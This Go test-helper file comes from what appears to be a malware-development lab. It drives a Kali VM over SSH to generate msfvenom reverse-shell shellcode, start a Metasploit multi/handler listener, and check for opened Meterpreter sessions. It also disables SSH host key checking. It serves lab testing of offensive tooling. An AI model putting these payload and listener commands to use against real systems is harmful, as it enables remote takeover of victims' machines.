package testutil

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

// Kali VM network and credentials. The exported constants keep the
// VirtualBox NAT setup (localhost:2223, host-only 192.168.56.200) as the
// baseline; every value is overridable via MALDEV_KALI_* environment
// variables so the same tests run unchanged on a libvirt host where Kali
// sits behind a different IP/port.
const (
	KaliHost    = "192.168.56.200" // LHOST for reverse-payloads — override via MALDEV_KALI_HOST
	KaliUser    = "kali"
	KaliSSHPort = "2223"
	KaliSSHKey  = "/tmp/vm_kali_key"
)

// kaliSSHHost returns the SSH connect target. VBox uses the host-side NAT
// port (localhost:2223); libvirt setups should set MALDEV_KALI_SSH_HOST to
// the guest IP discovered via `virsh domifaddr kali`.
func kaliSSHHost() string {
	if v := os.Getenv("MALDEV_KALI_SSH_HOST"); v != "" {
		return v
	}
	return "localhost"
}

func kaliSSHPort() string {
	if v := os.Getenv("MALDEV_KALI_SSH_PORT"); v != "" {
		return v
	}
	return KaliSSHPort
}

func kaliSSHKey() string {
	if v := os.Getenv("MALDEV_KALI_SSH_KEY"); v != "" {
		return v
	}
	return KaliSSHKey
}

func kaliUser() string {
	if v := os.Getenv("MALDEV_KALI_USER"); v != "" {
		return v
	}
	return KaliUser
}

// KaliSSH runs a command on the Kali VM via SSH and returns stdout.
// Connection target is kaliSSHHost():kaliSSHPort(), key kaliSSHKey() —
// all three resolve to the VBox NAT defaults unless MALDEV_KALI_SSH_*
// environment variables override them (libvirt hosts).
func KaliSSH(t *testing.T, cmd string, timeout time.Duration) string {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	c := exec.CommandContext(ctx, "ssh",
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=/dev/null",
		"-o", "ConnectTimeout=5",
		"-i", kaliSSHKey(),
		"-p", kaliSSHPort(),
		fmt.Sprintf("%s@%s", kaliUser(), kaliSSHHost()),
		cmd,
	)
	out, err := c.CombinedOutput()
	if err != nil {
		t.Logf("KaliSSH(%q) error: %v\nOutput: %s", cmd, err, out)
	}
	return strings.TrimSpace(string(out))
}

// KaliGenerateShellcode runs msfvenom on Kali and returns raw shellcode.
func KaliGenerateShellcode(t *testing.T, payload, lhost, lport string) []byte {
	t.Helper()
	cmd := fmt.Sprintf("msfvenom -p %s LHOST=%s LPORT=%s -f raw 2>/dev/null",
		payload, lhost, lport)
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()
	c := exec.CommandContext(ctx, "ssh",
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=/dev/null",
		"-i", kaliSSHKey(),
		"-p", kaliSSHPort(),
		fmt.Sprintf("%s@%s", kaliUser(), kaliSSHHost()),
		cmd,
	)
	out, err := c.Output()
	if err != nil {
		t.Fatalf("msfvenom failed: %v", err)
	}
	if len(out) == 0 {
		t.Fatal("msfvenom produced empty output")
	}
	t.Logf("Generated %d bytes of %s shellcode", len(out), payload)
	return out
}

// KaliStartListener starts a Metasploit handler on Kali.
// Returns a cleanup function that kills msfconsole.
//
// Key trick: the -x commands end with "sleep 3600" (an MSF command, not bash).
// Without it, msfconsole exits after the last -x command when stdin is /dev/null.
// The sleep keeps the MSF process alive for 1 hour while the handler runs.
func KaliStartListener(t *testing.T, payload, lhost, lport string) func() {
	t.Helper()
	msfCmd := fmt.Sprintf(
		"use exploit/multi/handler; set PAYLOAD %s; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j -z; sleep 3600",
		payload, lhost, lport)
	KaliSSH(t, fmt.Sprintf(
		`nohup msfconsole -q -x "%s" > /tmp/msf.log 2>&1 &`, msfCmd),
		15*time.Second)
	// MSF boot takes ~15-20s (Ruby + modules).
	time.Sleep(25 * time.Second)
	log := KaliSSH(t, "cat /tmp/msf.log 2>/dev/null | tail -5", 10*time.Second)
	t.Logf("MSF handler log:\n%s", log)
	if !strings.Contains(log, "Started reverse") {
		t.Fatal("MSF handler did not start — check Kali VM")
	}
	return func() {
		KaliSSH(t, "kill $(pgrep -f 'ruby.*msf') 2>/dev/null", 10*time.Second)
		time.Sleep(2 * time.Second)
	}
}

// KaliCheckSession checks if any Meterpreter session was opened on Kali.
func KaliCheckSession(t *testing.T) bool {
	t.Helper()
	out := KaliSSH(t, "grep -c 'Meterpreter session.*opened' /tmp/msf.log 2>/dev/null", 10*time.Second)
	return strings.TrimSpace(out) != "0" && strings.TrimSpace(out) != ""
}
